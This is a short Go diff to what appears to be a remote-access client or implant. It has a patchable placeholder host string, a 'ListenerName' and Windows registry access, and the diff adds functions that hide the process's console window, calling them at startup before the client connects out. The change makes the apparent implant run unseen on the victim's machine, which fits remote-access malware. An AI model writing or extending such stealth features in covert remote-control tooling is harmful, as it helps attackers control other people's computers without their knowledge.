@@ -13,6 +13,7 @@ import (
 	"sync"
 	"time"
 
+	"github.com/gonutz/ide/w32"
 	"golang.org/x/sys/windows/registry"
 )
 
@@ -176,6 +177,22 @@ func (s *TCPClient) CloseConnection() {
 
 var ClientWorking bool
 
+func ShowConsole() {
+	ShowConsoleAsync(w32.SW_SHOW)
+}
+
+func ShowConsoleAsync(commandShow uintptr) {
+	console := w32.GetConsoleWindow()
+	if console != 0 {
+		_, consoleProcID := w32.GetWindowThreadProcessId(console)
+		if w32.GetCurrentProcessId() == consoleProcID {
+			w32.ShowWindowAsync(console, commandShow)
+		}
+	}
+}
+func HideConsole() {
+	ShowConsoleAsync(w32.SW_HIDE)
+}
 func main() {
 
 	Host := "HostAAAABBBBCCCCDDDD"
@@ -188,6 +205,7 @@ func main() {
 	// PcInfo.Host = "192.168.31.81"
 	// PcInfo.Port = "4000"
 	// PcInfo.ListenerName = "asd"
+	HideConsole()
 	PcInfo.IsDotNetFour = checkDotNetFramework40()
 	ClientWorking = true
 	socket := TCPClient{}
